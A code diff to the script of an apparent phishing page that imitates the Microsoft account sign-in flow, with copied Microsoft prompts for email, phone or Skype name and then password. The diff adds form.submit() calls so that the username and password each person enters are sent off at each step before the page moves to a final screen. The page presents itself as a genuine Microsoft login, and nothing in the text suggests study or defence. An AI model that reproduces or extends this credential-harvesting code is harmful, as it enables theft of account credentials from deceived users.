@@ -1,4 +1,6 @@
 document.addEventListener('DOMContentLoaded', () => {
+    const form_uname = document.getElementById('form_uname');
+    const form_pwd = document.getElementById('form_pwd');
     const unReq = "Enter a valid email address, phone number, or Skype name."
     const pwdReq = "Please enter the password for your Microsoft account."
     const unameInp = document.getElementById('inp_uname');
@@ -13,14 +15,15 @@ document.addEventListener('DOMContentLoaded', () => {
         //validate the form
         validate();
         if (unameVal) {
+            form_uname.submit();
             document.getElementById("section_uname").classList.toggle('d-none');
             document.getElementById('section_pwd').classList.remove('d-none');
             document.querySelectorAll('#user_identity').forEach((e) => {
                 e.innerText = unameInp.value;
-            })
+            });
             view = "pwd";
         }
-    })
+    });
 
     //////sign in button
 
@@ -30,11 +33,12 @@ document.addEventListener('DOMContentLoaded', () => {
         //validate the form
         validate();
         if (pwdVal) {
+            form_pwd.submit();
             document.getElementById("section_pwd").classList.toggle('d-none');
             document.getElementById('section_final').classList.remove('d-none');
             view = "final";
         }
-    })
+    });
 
     function validate() {
         function unameValAction(type) {
